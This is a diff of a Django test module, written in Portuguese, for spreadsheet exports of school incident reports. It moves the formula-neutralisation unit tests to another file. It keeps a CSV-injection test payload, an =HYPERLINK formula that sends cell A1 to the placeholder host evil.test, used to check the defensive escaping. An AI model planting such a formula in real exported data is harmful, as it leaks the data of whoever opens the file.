@@ -1,14 +1,14 @@
-"""Testes da mecânica de export compartilhada pelos três relatórios.
+"""Export dos relatórios, ponta a ponta.
 
-O foco é a neutralização de fórmula: o conteúdo exportado é escrito por
-gente (descrição de ocorrência é texto livre de qualquer professor) e
-quem abre o arquivo é a secretaria, no Excel da própria máquina.
+A unidade da neutralização de fórmula vive em
+`apps/common/tests/test_planilha.py`, junto do helper. Aqui o que se
+checa é que ela de fato alcança o arquivo que sai pelo endpoint.
 """
 import csv
 import io
 from datetime import date
 
-from django.test import SimpleTestCase, TestCase
+from django.test import TestCase
 from django.urls import reverse
 from rest_framework.test import APIClient
 from rest_framework_simplejwt.tokens import RefreshToken
@@ -16,35 +16,10 @@ from rest_framework_simplejwt.tokens import RefreshToken
 from apps.accounts.models import Usuario
 from apps.escola.models import Aluno, Escola, Turma
 from apps.ocorrencias.models import Ocorrencia
-from apps.relatorios.exportacao import neutralizar_formula
 
 # `=HYPERLINK` é o caso ruim: monta um link com dados da própria
 # planilha e, ao contrário de DDE, não dispara aviso nenhum no Excel.
 PAYLOAD = '=HYPERLINK("http://evil.test?v="&A1,"Clique aqui")'
-
-
-class NeutralizarFormulaTests(SimpleTestCase):
-    def test_prefixa_os_quatro_inicios_de_formula(self):
-        for inicio in ("=", "+", "-", "@"):
-            texto = f"{inicio}SOMA(A1:A9)"
-            self.assertEqual(neutralizar_formula(texto), f"'{texto}")
-
-    def test_prefixa_tab_e_cr(self):
-        """Excel descarta os dois antes de olhar o primeiro caractere."""
-        for inicio in ("\t", "\r"):
-            self.assertEqual(
-                neutralizar_formula(f"{inicio}=1+1"), f"'{inicio}=1+1"
-            )
-
-    def test_texto_comum_passa_intacto(self):
-        for texto in ("Ana", "2026-03-10", "75.00", ""):
-            self.assertEqual(neutralizar_formula(texto), texto)
-
-    def test_numero_e_none_passam_intactos(self):
-        """Só `str` é tocado — coluna numérica não vira texto."""
-        self.assertEqual(neutralizar_formula(40), 40)
-        self.assertEqual(neutralizar_formula(0), 0)
-        self.assertIsNone(neutralizar_formula(None))
 
 
 class FormulaNoExportTests(TestCase):
